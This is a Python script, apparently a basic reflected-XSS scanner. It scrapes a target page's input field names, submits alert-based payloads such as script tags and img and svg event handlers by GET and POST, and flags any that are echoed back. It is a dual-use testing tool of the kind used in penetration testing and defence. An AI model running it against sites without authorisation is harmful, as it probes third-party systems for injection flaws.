import requests
from bs4 import BeautifulSoup
import urllib.parse

def load_payloads(filename="xss_payloads_list.txt"):
    try:
        with open(filename, "r", encoding="utf-8") as file:
            return [
                line.strip()
                for line in file
                if line.strip() and not line.startswith("#")
            ]
    except FileNotFoundError:
        print(f"Error: {filename} not found. Using default payloads.")
        return [
            "<script>alert('find')</script>",
            "<img src=x onerror=alert('find')>",
            "<svg onload=alert('find')>",
            "javascript:alert('find')",
        ]


def test_xss(url, params):
    # Load XSS payloads from file
    xss_payloads = load_payloads()

    for payload in xss_payloads:
        # Encode the payload
        encoded_payload = urllib.parse.quote(payload)

        # Test GET parameters
        for param in params:
            test_url = f"{url}?{param}={encoded_payload}"
            response = requests.get(test_url)

            if payload in response.text:
                print(
                    f"Potential XSS found in GET parameter '{param}' with payload: {payload}"
                )

        # Test POST parameters
        for param in params:
            data = {param: payload}
            response = requests.post(url, data=data)

            if payload in response.text:
                print(
                    f"Potential XSS found in POST parameter '{param}' with payload: {payload}"
                )


def find_input_fields(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    input_fields = []
    for input_tag in soup.find_all("input"):
        if "name" in input_tag.attrs:
            input_fields.append(input_tag["name"])

    return input_fields


# Main execution
if __name__ == "__main__":
    target_url = input("\nEnter the target URL: ")
    params = find_input_fields(target_url)

    if not params:
        print(
            "\nNo input fields found.\nEnter parameters manually (comma-separated) or xx to exit: "
        )
        params = input().split(",")
        if params[0] == "xx":
            print("Exiting...")
            exit()

    test_xss(target_url, params)
